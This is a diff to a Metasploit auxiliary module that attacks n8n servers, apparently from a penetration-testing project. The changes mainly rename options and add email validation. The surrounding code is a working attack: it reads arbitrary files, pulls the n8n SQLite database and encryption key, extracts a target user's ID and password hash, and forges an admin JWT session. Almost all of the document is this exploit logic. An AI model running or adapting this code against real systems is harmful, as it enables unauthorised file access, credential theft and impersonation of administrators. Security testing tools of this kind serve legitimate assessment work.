@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'Actions' => [
           ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],
-          ['EXTRACT_SESSION', { 'Description' => 'Create admin JWT sessio key by reading out secrets' }]
+          ['EXTRACT_SESSION', { 'Description' => 'Create an admin JWT session key by reading out secrets' }]
         ],
         'DefaultAction' => 'EXTRACT_SESSION',
         'License' => MSF_LICENSE,
@@ -32,10 +32,10 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options([
-      OptString.new('SPOOFED_EMAIL', [false, 'A target user for spoofed session, when EXTRACT_ADMIN_SESSION action is set']),
-      OptString.new('TARGET_FILENAME', [false, 'A target filename, when READ_FILE action is set']),
-      OptString.new('EMAIL', [true, 'Username of n8n', '']),
-      OptString.new('PASSWORD', [true, 'Password of n8n', ''])
+      OptString.new('TARGET_EMAIL', [false, 'A target user for spoofed session, when EXTRACT_ADMIN_SESSION action is set'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),
+      OptString.new('TARGET_FILENAME', [false, 'A target filename, when READ_FILE action is set'], conditions: ['ACTION', '==', 'READ_FILE']),
+      OptString.new('USERNAME', [true, 'Username of n8n (email address)']),
+      OptString.new('PASSWORD', [true, 'Password of n8n'])
     ])
   end
 
@@ -77,8 +77,8 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => 'application/json',
       'keep_cookies' => true,
       'data' => {
-        'emailOrLdapLoginId' => datastore['EMAIL'],
-        'email' => datastore['EMAIL'],
+        'emailOrLdapLoginId' => datastore['USERNAME'],
+        'email' => datastore['USERNAME'],
         'password' => datastore['PASSWORD']
       }.to_json
     )
@@ -231,6 +231,10 @@ class MetasploitModule < Msf::Auxiliary
     true
   end
 
+  def valid_username?(username)
+    /\A[\w+\-.]+@[a-z\d-]+(\.[a-z\d-]+)*\.[a-z]+\z/i =~ username
+  end
+
   def delete_workflow
     res = send_request_cgi(
       'method' => 'DELETE',
@@ -293,9 +297,8 @@ class MetasploitModule < Msf::Auxiliary
     file_content
   end
 
-  def check; end
-
   def run
+    fail_with(Failure::BadConfig, 'Username should be valid email') unless valid_username?(datastore['USERNAME'])
     fail_with(Failure::NoAccess, 'Failed to login') unless login
 
     case action.name
@@ -308,9 +311,10 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Results saved to: #{stored_path}")
 
     when 'EXTRACT_SESSION'
-      target_username = datastore['SPOOFED_EMAIL']
+      target_email = datastore['TARGET_EMAIL']
 
-      fail_with(Failure::BadConfig, 'Spoofed email needs to be set') if target_username.blank?
+      fail_with(Failure::BadConfig, 'Target email needs to be set') if target_email.blank?
+      fail_with(Failure::BadConfig, 'Target email should be valid email') unless valid_username?(target_email)
 
       db_content = read_file('/home/node/.n8n/database.sqlite')
 
@@ -320,8 +324,8 @@ class MetasploitModule < Msf::Auxiliary
 
       db = SQLite3::Database.new(db_loot_name)
 
-      user_id = db.execute(%(select id from user where email='#{target_username}'))[0][0]
-      password_hash = db.execute(%(select password from user where email='#{target_username}'))[0][0]
+      user_id = db.execute(%(select id from user where email='#{target_email}'))[0][0]
+      password_hash = db.execute(%(select password from user where email='#{target_email}'))[0][0]
 
       print_good("Extracted user ID: #{user_id}")
       print_good("Extracted password hash: #{password_hash}")
@@ -339,11 +343,11 @@ class MetasploitModule < Msf::Auxiliary
       encryption_key = (0...encryption_key.length).step(2).map { |i| encryption_key[i] }
       encryption_key = encryption_key.join('')
 
-      jwt_payload = %({"id":"#{user_id}","hash":"#{Base64.urlsafe_encode64(Digest::SHA256.digest("#{target_username}:#{password_hash}"))[0..9]}"})
+      jwt_payload = %({"id":"#{user_id}","hash":"#{Base64.urlsafe_encode64(Digest::SHA256.digest("#{target_email}:#{password_hash}"))[0..9]}"})
 
       jwt_ticket = Msf::Exploit::Remote::HTTP::JWT.encode(jwt_payload.to_s, OpenSSL::Digest::SHA256.hexdigest(encryption_key))
 
-      print_good("JWT ticket as #{target_username}: #{jwt_ticket}")
+      print_good("JWT ticket as #{target_email}: #{jwt_ticket}")
 
     end
   end
